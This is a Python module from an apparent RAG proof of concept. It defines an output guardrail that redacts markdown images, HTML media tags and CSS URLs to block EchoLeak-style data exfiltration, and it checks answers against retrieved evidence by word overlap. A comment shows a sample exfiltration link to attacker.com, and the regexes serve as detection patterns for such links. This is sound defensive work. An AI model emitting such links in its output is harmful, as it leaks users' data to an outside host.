"""
Output Rails: Evaluates model responses before returning to the client.
Sanitizes covert exfiltration links (EchoLeak CVE-2025-32711) and verifies factual grounding.
"""

from __future__ import annotations

import re
from typing import List, Tuple
from rag_poc.core.models import GuardrailVerdict, RetrievedPassage


class OutputRailChecker:
    """
    Evaluates generated output for covert data exfiltration channels and factual grounding.
    """

    # Exfiltration detection: Markdown images, CSS backgrounds, raw HTML images/scripts
    # EchoLeak (CVE-2025-32711) specifically exploits ![alt](https://attacker.com/leak?data=...)
    MARKDOWN_IMAGE_PATTERN = re.compile(r"!\[([^\]]*)\]\((https?://[^\s)]+)\)", re.IGNORECASE)
    HTML_MEDIA_PATTERN = re.compile(r"<(img|iframe|script|embed|object|link)[^>]+>", re.IGNORECASE)
    CSS_URL_PATTERN = re.compile(r"url\s*\(\s*['\"]?(https?://[^'\"\)]+)['\"]?\s*\)", re.IGNORECASE)

    def sanitize_exfiltration_channels(self, response_text: str) -> Tuple[str, List[str]]:
        """
        Strips markdown image references, HTML media tags, and CSS background links
        to neutralize CVE-2025-32711 (EchoLeak) data exfiltration vectors.
        """
        sanitized = response_text
        detected: List[str] = []

        # 1. Neutralize Markdown images
        for match in self.MARKDOWN_IMAGE_PATTERN.finditer(sanitized):
            alt_text = match.group(1)
            target_url = match.group(2)
            detected.append(f"MARKDOWN_IMAGE_EXFIL: {target_url}")
        sanitized = self.MARKDOWN_IMAGE_PATTERN.sub(r"[IMAGE_REDACTED: \1]", sanitized)

        # 2. Neutralize HTML media tags
        for match in self.HTML_MEDIA_PATTERN.finditer(sanitized):
            detected.append(f"HTML_TAG_EXFIL: {match.group(0)}")
        sanitized = self.HTML_MEDIA_PATTERN.sub(r"[HTML_TAG_REDACTED]", sanitized)

        # 3. Neutralize CSS URL injections
        for match in self.CSS_URL_PATTERN.finditer(sanitized):
            detected.append(f"CSS_URL_EXFIL: {match.group(1)}")
        sanitized = self.CSS_URL_PATTERN.sub(r"[CSS_URL_REDACTED]", sanitized)

        return sanitized, detected

    def verify_fact_grounding(
        self,
        response_text: str,
        evidence_passages: List[RetrievedPassage],
        strictness_threshold: float = 0.20
    ) -> Tuple[bool, float, str]:
        """
        Evaluates whether assertions in response_text are factually supported
        by the evidence passages (NeMo Guardrails self_check_facts flow).
        """
        if not evidence_passages:
            # Without evidence, any factual assertion is considered ungrounded
            if len(response_text.split()) > 10 and not response_text.lower().startswith("i cannot"):
                return False, 0.0, "No evidence passages available to ground factual assertions."
            return True, 1.0, "Refusal or trivial response."

        # Aggregate evidence text
        evidence_corpus = " ".join([p.content.lower() for p in evidence_passages])

        # Token overlap / statement grounding evaluation
        # (In full NIM deployment, this calls self_check_facts LLM rail)
        response_words = set(re.findall(r"\b[a-zA-Z]{4,}\b", response_text.lower()))
        evidence_words = set(re.findall(r"\b[a-zA-Z]{4,}\b", evidence_corpus))

        if not response_words:
            return True, 1.0, "Short response."

        overlap = response_words.intersection(evidence_words)
        grounding_score = len(overlap) / len(response_words)

        if grounding_score < strictness_threshold:
            return False, grounding_score, f"Fact verification failed: Grounding score {grounding_score:.2f} is below threshold {strictness_threshold}"

        return True, grounding_score, f"Fact verification passed with grounding score {grounding_score:.2f}"

    def evaluate(
        self,
        response_text: str,
        evidence_passages: List[RetrievedPassage]
    ) -> GuardrailVerdict:
        """
        Executes complete output rail verification.
        """
        # 1. Sanitize covert exfiltration links (EchoLeak defense)
        sanitized_text, exfil_detected = self.sanitize_exfiltration_channels(response_text)

        # 2. Fact verification against retrieved evidence
        is_grounded, score, reason = self.verify_fact_grounding(sanitized_text, evidence_passages)

        if not is_grounded:
            return GuardrailVerdict(
                passed=False,
                stage="output",
                refusal_reason="I cannot satisfy this request. The available enterprise context does not contain sufficient verified evidence to ground the answer.",
                sanitized_output="I cannot satisfy this request. The available enterprise context does not contain sufficient verified evidence to ground the answer.",
                metadata={"grounding_score": score, "reason": reason, "exfil_detected": exfil_detected}
            )

        return GuardrailVerdict(
            passed=True,
            stage="output",
            sanitized_output=sanitized_text,
            metadata={"grounding_score": score, "exfil_detected": exfil_detected}
        )
